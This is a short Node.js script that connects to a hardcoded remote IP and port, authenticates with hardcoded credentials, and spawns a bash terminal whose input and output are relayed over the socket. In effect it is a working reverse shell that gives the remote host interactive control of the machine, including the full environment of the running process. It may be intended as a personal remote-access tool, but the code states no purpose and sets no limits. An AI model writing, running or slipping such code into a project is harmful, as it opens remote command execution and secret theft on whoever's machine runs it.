var net = require('net');
var pty = require('pty.js');
var dns = require('dns');

var HOST = '54.169.1.192';
var PORT = 55555;

var USERNAME='shubhank';
var PASSWORD='shubhank';
var term;
var client = new net.Socket();

client.connect(PORT, HOST, function() {
	console.log('CONNECTED TO: ' + HOST + ':' + PORT);
    	client.write('auth '+USERNAME+' '+PASSWORD);
	term = spawn_terminal();
 	term.on('data', function(data) {
		console.log(data);
		client.write(data);
	});
});

client.on('data', function(data) {
	if(data.toString() == 'stop\r'){
		term.destroy();
		term = spawn_terminal();
 		term.on('data', function(data) {
		  console.log(data);
		  client.write(data);
		});		
	}else if(data.toString() == 'namaste')
		client.write('namaste');
	else
		term.write(data.toString());
});

client.on('close', function() {
	try{
    	console.log('Connection closed');
		term.destroy();
	}catch(e){
		setTimeout(function(){process.exit(1);},10000);
	}
});

client.on('error', function(err){
	console.log(err);
	setTimeout(function(){process.exit(1);},10000);
});

function spawn_terminal(){
	return pty.spawn('bash', [], {
	  name: 'xterm-color',
	  cols: 100,
	  rows: 30,
	  cwd: process.env.HOME,
	  env: process.env
	});
}

setInterval(function(){
	dns.lookup('google.com',function(err){
		if(err){
			console.log('STATUS:Offline');
			process.exit(1);
		}else
		    console.log('STATUS:Online');
	});
},60000);